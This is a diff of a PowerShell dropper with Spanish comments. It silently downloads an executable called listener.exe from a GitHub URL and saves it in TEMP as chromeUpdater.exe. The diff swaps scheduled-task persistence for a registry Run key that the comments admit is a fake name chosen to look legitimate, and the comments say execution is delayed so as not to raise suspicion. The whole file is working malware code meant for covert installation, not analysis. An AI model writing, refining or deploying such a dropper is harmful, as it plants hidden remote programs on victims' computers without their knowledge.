@@ -1,33 +1,34 @@
-# payload.ps1
-# Configuración
-$targetPath = "$env:TEMP\chromeUpdater.exe"
-$taskName = "SystemUpdateCheck"
-$downloadUrl = "https://raw.githubusercontent.com/C5rsdMat1X5/middle-server-comms/refs/heads/master/execs/listener.exe"
+# installer.ps1
+# Objetivo: Descargar x.exe y establecer persistencia vía Registro (HKCU Run)
+# Esto evita los problemas de permisos de la Task Scheduler y carpetas Temp.
 
-# 1. Descargar el archivo (Silencioso, sin prompts)
-# Usamos Invoke-WebRequest que es nativo y no pide confirmación si se usa -OutFile
+$targetPath = "$env:TEMP\chromeUpdater.exe"
+$downloadUrl = "https://raw.githubusercontent.com/C5rsdMat1X5/middle-server-comms/refs/heads/master/execs/listener.exe" # Cambia esto por tu URL real si es diferente
+$regPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
+$regName = "SystemUpdateService" # Nombre falso para parecer legítimo
+
+# 1. Descargar el archivo
 try {
     Invoke-WebRequest -Uri $downloadUrl -OutFile $targetPath -UseBasicParsing
 }
 catch {
-    Write-Error "Error al descargar: $_"
+    # Si falla la descarga, no podemos continuar
     exit 1
 }
 
-# 2. Crear la tarea programada (Persistencia)
-# Esto se ejecuta en el contexto del usuario actual, no requiere Admin.
-$action = New-ScheduledTaskAction -Execute $targetPath
-$trigger = New-ScheduledTaskTrigger -AtLogOn
-$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive
-
+# 2. Establecer persistencia vía Registro
+# Esto funciona sin permisos de administrador y no es bloqueado por estar en Temp
 try {
-    # Intentamos registrar la tarea. Si ya existe, la actualizamos o la ignoramos.
-    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force
+    New-ItemProperty -Path $regPath -Name $regName -Value $targetPath -PropertyType STRING -Force
 }
 catch {
-    # Si falla (ej. política de grupo), el script termina pero el archivo ya fue descargado.
-    Write-Error "No se pudo crear la tarea: $_"
+    # Si falla, el script termina. No hacemos ruido.
+    exit 1
 }
 
-# 3. Ejecutar inmediatamente (Opcional, para demostración)
+# 3. (Opcional) No ejecutamos inmediatamente para no levantar sospechas,
+# la persistencia se activará en el siguiente reinicio/inicio de sesión.
+# Si necesitas probar que funciona, descomenta la siguiente línea:
 # Start-Process $targetPath
+
+exit 0
